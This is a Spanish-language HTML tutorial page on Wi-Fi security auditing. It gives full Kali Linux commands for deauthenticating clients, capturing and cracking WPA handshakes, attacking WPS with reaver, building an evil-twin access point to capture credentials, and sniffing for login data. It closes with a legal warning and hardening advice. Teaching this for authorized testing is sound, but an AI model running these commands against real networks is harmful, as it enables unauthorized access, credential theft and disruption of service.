@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureLab - Auditoría Completa de Redes Wi-Fi</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+      line-height: 1.6;
+    }
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+    .header {
+      text-align: center;
+      border: 2px solid #00ff00;
+      padding: 25px;
+      margin-bottom: 30px;
+      background: rgba(0, 255, 0, 0.1);
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+    }
+    .header h1 {
+      font-size: 2.5em;
+      text-shadow: 0 0 15px #00ff00;
+      margin-bottom: 10px;
+    }
+    .header p {
+      font-size: 1.1em;
+      color: #ccffcc;
+      margin: 0;
+    }
+    .section {
+      background: rgba(0, 30, 0, 0.2);
+      border: 1px solid #00cc00;
+      padding: 25px;
+      margin-bottom: 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+    .section h2 {
+      color: #00ffff;
+      border-bottom: 2px solid #00ffff;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+      font-size: 1.4em;
+    }
+    .section h3 {
+      color: #ffff00;
+      margin: 20px 0 15px 0;
+      font-size: 1.2em;
+    }
+    .section p, .section ul, .section li {
+      color: #ccffcc;
+      line-height: 1.8;
+      margin-bottom: 15px;
+    }
+    .section ul {
+      padding-left: 20px;
+    }
+    .section li {
+      margin-bottom: 10px;
+    }
+    pre {
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      border: 1px solid #00ff00;
+      border-radius: 5px;
+      overflow-x: auto;
+      margin: 15px 0;
+      font-size: 0.9em;
+    }
+    .examples-section ul {
+      list-style-type: none;
+      padding-left: 0;
+    }
+    .examples-section > ul > li {
+      background: rgba(0, 50, 0, 0.4);
+      margin-bottom: 15px;
+      padding: 20px;
+      border-radius: 6px;
+      border-left: 4px solid #00ff00;
+    }
+    .examples-section strong {
+      color: #ffff00;
+      font-size: 1.2em;
+      display: block;
+      margin-bottom: 10px;
+    }
+    .phase-section {
+      background: rgba(0, 40, 40, 0.2);
+      border-left: 4px solid #00ffff;
+    }
+    .attack-section {
+      background: rgba(40, 0, 0, 0.2);
+      border-left: 4px solid #ff6600;
+    }
+    .tools-highlight {
+      background: rgba(50, 50, 0, 0.2);
+      padding: 10px;
+      border-radius: 4px;
+      color: #ffff99;
+      font-weight: bold;
+      margin: 10px 0;
+    }
+    .warning {
+      background: rgba(80, 20, 0, 0.3);
+      border: 1px solid #ff6600;
+      padding: 15px;
+      border-radius: 5px;
+      color: #ffcc99;
+      margin: 20px 0;
+    }
+    .warning::before {
+      content: "⚠️ ";
+      font-size: 1.2em;
+    }
+    footer {
+      text-align: center;
+      padding: 20px;
+      border-top: 2px solid #00ff00;
+      margin-top: 50px;
+      color: #00ff00;
+    }
+    footer a {
+      color: #00ffff;
+      text-decoration: none;
+      transition: color 0.3s;
+    }
+    footer a:hover {
+      color: #ffff00;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+      gap: 25px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Auditoría Completa de Redes Wi-Fi</h1>
+      <p>Guía Técnica Avanzada para Evaluación de Seguridad Inalámbrica</p>
+    </div>
+
+    <div class="section">
+      <h2>¿Qué es la Auditoría Wi-Fi?</h2>
+      <p>La auditoría Wi-Fi es un proceso exhaustivo de evaluación de la seguridad en redes inalámbricas con el objetivo de identificar vulnerabilidades como contraseñas débiles, configuraciones WPS inseguras, cifrado obsoleto, y otros puntos débiles en la infraestructura inalámbrica.</p>
+      <p>Este proceso permite a las organizaciones:</p>
+      <ul>
+        <li>Identificar vulnerabilidades antes de que sean explotadas por atacantes</li>
+        <li>Validar la efectividad de las políticas de seguridad implementadas</li>
+        <li>Cumplir con estándares de seguridad y regulaciones</li>
+        <li>Fortalecer la postura de seguridad general de la red</li>
+      </ul>
+    </div>
+
+    <div class="section phase-section">
+      <h2>🔍 Fases de la Auditoría Wi-Fi</h2>
+      
+      <h3>1. Fase de Pre-Auditoría (Reconocimiento)</h3>
+      <p><strong>Identificación del Objetivo:</strong> Localización y catalogación de todas las redes Wi-Fi en el área objetivo, recopilando información crítica sobre:</p>
+      <ul>
+        <li><strong>SSIDs:</strong> Nombres de red visibles y ocultos</li>
+        <li><strong>BSSIDs:</strong> Direcciones MAC únicas de los puntos de acceso</li>
+        <li><strong>Canales de operación:</strong> Frecuencias utilizadas (2.4GHz/5GHz)</li>
+        <li><strong>Tipos de seguridad:</strong> WEP, WPA/WPA2, WPA3, redes abiertas</li>
+        <li><strong>Intensidad de señal:</strong> Para determinar proximidad y cobertura</li>
+      </ul>
+      
+      <div class="tools-highlight">
+        Herramientas clave: Airodump-ng, Kismet, Wireshark
+      </div>
+
+      <p><strong>Preparación del Hardware:</strong> Verificación de compatibilidad del adaptador inalámbrico para soportar:</p>
+      <ul>
+        <li>Modo monitor (captura pasiva de tráfico)</li>
+        <li>Inyección de paquetes (ataques activos)</li>
+        <li>Chipsets recomendados: Atheros, Realtek (ciertos modelos)</li>
+      </ul>
+
+      <h3>2. Captura y Análisis de Paquetes</h3>
+      <p><strong>Modo Monitor:</strong> Configuración del adaptador para capturar todo el tráfico inalámbrico del canal especificado, independientemente del destinatario. Esto permite:</p>
+      <ul>
+        <li>Interceptación de frames de gestión, control y datos</li>
+        <li>Análisis de patrones de tráfico</li>
+        <li>Identificación de dispositivos conectados</li>
+      </ul>
+
+      <p><strong>Captura de Handshakes WPA/WPA2:</strong> El handshake de 4 vías contiene elementos criptográficos esenciales:</p>
+      <ul>
+        <li>EAPOL frames que contienen claves derivadas</li>
+        <li>Nonces aleatorios del cliente y punto de acceso</li>
+        <li>Información necesaria para el cracking offline</li>
+      </ul>
+
+      <p><strong>Diferencia entre Ataques:</strong></p>
+      <ul>
+        <li><strong>Pasivos:</strong> Escucha silenciosa, captura de handshakes naturales</li>
+        <li><strong>Activos:</strong> Inyección de paquetes, ataques de desautenticación, WPS</li>
+      </ul>
+    </div>
+
+    <div class="section attack-section">
+      <h2>⚔️ Técnicas de Cracking y Explotación</h2>
+
+      <h3>Ataques de Diccionario</h3>
+      <p>Método más común que utiliza listas de palabras predefinidas contra handshakes capturados:</p>
+      <ul>
+        <li>Diccionarios especializados (rockyou.txt, wordlists personalizadas)</li>
+        <li>Mutaciones de palabras (agregar números, símbolos)</li>
+        <li>Diccionarios basados en información de la organización objetivo</li>
+      </ul>
+      <div class="tools-highlight">
+        Herramientas: Aircrack-ng, Hashcat (GPU-accelerated)
+      </div>
+
+      <h3>Ataques de Fuerza Bruta</h3>
+      <p>Cuando fallan los diccionarios, se prueban todas las combinaciones posibles:</p>
+      <ul>
+        <li>Computacionalmente intensivo</li>
+        <li>Efectivo para contraseñas cortas o simples</li>
+        <li>Tiempo de ejecución exponencial según longitud y complejidad</li>
+      </ul>
+
+      <h3>Ataques WPS (Wi-Fi Protected Setup)</h3>
+      <p>Explotación de vulnerabilidades en el protocolo WPS:</p>
+      <ul>
+        <li>Fuerza bruta al PIN de 8 dígitos (reducido a ~11,000 intentos)</li>
+        <li>Bypass de contraseñas WPA2 robustas</li>
+        <li>Vulnerabilidad en el proceso de verificación del PIN</li>
+      </ul>
+      <div class="tools-highlight">
+        Herramientas: Reaver, Bully, Pixie-Dust attacks
+      </div>
+
+      <h3>Ataques Evil Twin</h3>
+      <p>Creación de puntos de acceso falsos que imitan redes legítimas:</p>
+      <ul>
+        <li>Mismo SSID que la red objetivo</li>
+        <li>Señal más fuerte para atraer conexiones</li>
+        <li>Captura de credenciales y ataques man-in-the-middle</li>
+        <li>Portales cautivos maliciosos</li>
+      </ul>
+
+      <h3>Ataques de Desautenticación</h3>
+      <p>Envío de tramas de desautenticación para:</p>
+      <ul>
+        <li>Forzar desconexión de clientes legítimos</li>
+        <li>Provocar reconexiones para capturar handshakes</li>
+        <li>Facilitar ataques Evil Twin</li>
+        <li>Crear denegación de servicio (DoS)</li>
+      </ul>
+    </div>
+
+    <div class="examples-section section">
+      <h2>🔧 6 Ejemplos Prácticos con Kali Linux</h2>
+      <ul>
+        <li>
+          <strong>1. Captura de Handshake WPA/WPA2</strong>
+          <p>Proceso fundamental para obtener los elementos criptográficos necesarios para el cracking offline:</p>
+          <pre># Activar modo monitor
+sudo airmon-ng start wlan0
+
+# Escanear redes disponibles
+sudo airodump-ng wlan0mon
+
+# Capturar tráfico de red específica
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan0mon
+
+# En otra terminal, forzar desautenticación
+sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon</pre>
+          <div class="tools-highlight">Herramientas: Airodump-ng, Aireplay-ng</div>
+        </li>
+        
+        <li>
+          <strong>2. Cracking de Contraseñas WPA/WPA2 con Diccionario</strong>
+          <p>Aplicación de ataques de diccionario utilizando listas de palabras predefinidas:</p>
+          <pre># Verificar handshake capturado
+aircrack-ng captura-01.cap
+
+# Cracking con Aircrack-ng
+aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 captura-01.cap
+
+# Cracking acelerado por GPU con Hashcat
+hashcat -m 2500 -a 0 captura.hccapx rockyou.txt</pre>
+          <div class="tools-highlight">Herramientas: Aircrack-ng, Hashcat</div>
+        </li>
+
+        <li>
+          <strong>3. Ataque WPS con Reaver</strong>
+          <p>Explotación de vulnerabilidades WPS para recuperar la PSK:</p>
+          <pre># Escanear redes con WPS habilitado
+sudo wash -i wlan0mon
+
+# Ataque WPS con Reaver
+sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1
+
+# Ataque Pixie Dust (si es vulnerable)
+sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1 -P</pre>
+          <div class="tools-highlight">Herramientas: Reaver, Wash, Bully</div>
+        </li>
+
+        <li>
+          <strong>4. Creación de Evil Twin AP</strong>
+          <p>Configuración de punto de acceso malicioso para capturar credenciales:</p>
+          <pre># Crear punto de acceso falso
+sudo hostapd hostapd.conf &
+
+# Configurar DHCP
+sudo dnsmasq -C dnsmasq.conf &
+
+# Configurar iptables para redirección
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+
+# Monitorear conexiones
+sudo tcpdump -i wlan0 -w evil_twin_capture.pcap</pre>
+          <div class="tools-highlight">Herramientas: Hostapd, Dnsmasq, Bettercap</div>
+        </li>
+
+        <li>
+          <strong>5. Análisis de Tráfico Inalámbrico (Sniffing)</strong>
+          <p>Captura y análisis de tráfico para extraer información sensible:</p>
+          <pre># Captura de tráfico en tiempo real
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w sniff wlan0mon
+
+# Análisis con Wireshark
+wireshark sniff-01.cap
+
+# Filtros útiles en Wireshark:
+# http.request.method == "POST"
+# ftp or telnet or http.authbasic</pre>
+          <div class="tools-highlight">Herramientas: Wireshark, Airodump-ng</div>
+        </li>
+
+        <li>
+          <strong>6. Auditoría de Redes WEP (Histórico)</strong>
+          <p>Demostración de debilidades inherentes en el cifrado WEP:</p>
+          <pre># Capturar vectores de inicialización
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_crack wlan0mon
+
+# Inyección de paquetes para acelerar captura
+sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h cliente_mac wlan0mon
+
+# Cracking cuando se tengan suficientes IVs
+aircrack-ng -b 00:11:22:33:44:55 wep_crack*.cap</pre>
+          <div class="tools-highlight">Herramientas: Suite Aircrack-ng completa</div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="warning">
+      <strong>Consideraciones Legales y Éticas:</strong> La auditoría Wi-Fi debe realizarse únicamente en redes propias o con autorización explícita por escrito. El uso no autorizado de estas técnicas puede constituir un delito. Siempre seguir un marco de trabajo ético y legal en las pruebas de penetración.
+    </div>
+
+    <div class="section">
+      <h2>🛡️ Recomendaciones de Seguridad</h2>
+      <p>Basándose en las vulnerabilidades identificadas durante la auditoría:</p>
+      <ul>
+        <li><strong>Contraseñas robustas:</strong> Mínimo 12 caracteres con complejidad alta</li>
+        <li><strong>Deshabilitar WPS:</strong> Eliminar esta funcionalidad vulnerable</li>
+        <li><strong>Actualizar firmware:</strong> Mantener dispositivos con últimas versiones</li>
+        <li><strong>Segmentación de red:</strong> Separar tráfico crítico del acceso Wi-Fi</li>
+        <li><strong>Monitoreo continuo:</strong> Implementar sistemas de detección de intrusiones</li>
+        <li><strong>WPA3:</strong> Migrar a estándares de cifrado más modernos</li>
+      </ul>
+    </div>
+
+    <footer>
+      Página creada por EJ | <a href="https://github.com/ever186" target="_blank">GitHub</a> | 
+      Solo para uso educativo y autorizado
+    </footer>
+  </div>
+</body>
+</html>
